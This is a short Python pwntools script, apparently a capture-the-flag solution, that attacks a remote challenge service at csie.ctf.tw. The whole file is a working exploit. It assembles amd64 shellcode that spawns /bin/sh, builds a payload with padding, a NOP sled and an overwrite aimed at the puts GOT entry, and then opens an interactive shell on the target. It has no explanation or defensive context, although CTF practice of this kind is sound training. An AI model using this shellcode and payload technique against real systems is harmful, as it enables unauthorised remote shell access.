from pwn import *

r = remote('csie.ctf.tw',10129)
#r = remote('127.0.0.1',8888)

shell = '''xor rax,rax
push rax
mov rbx,0x68732f2f6e69622f
push rbx
lea rdi,[rsp]
mov ecx,eax
mov edx,eax
mov esi,eax
add eax,0x3b
syscall'''

shellcode = asm(shell,arch='amd64')
nop = asm('nop',arch='amd64')   #64 bits ELF
puts_got_addr = '601020'
shellcode_addr = p64(0x6010a0 + 0x8)

import time
time.sleep(8)
payload = 'A'*7 + '\0' + shellcode + nop*10 + puts_got_addr + '\0'*18 + shellcode_addr

r.send(payload)
r.interactive()

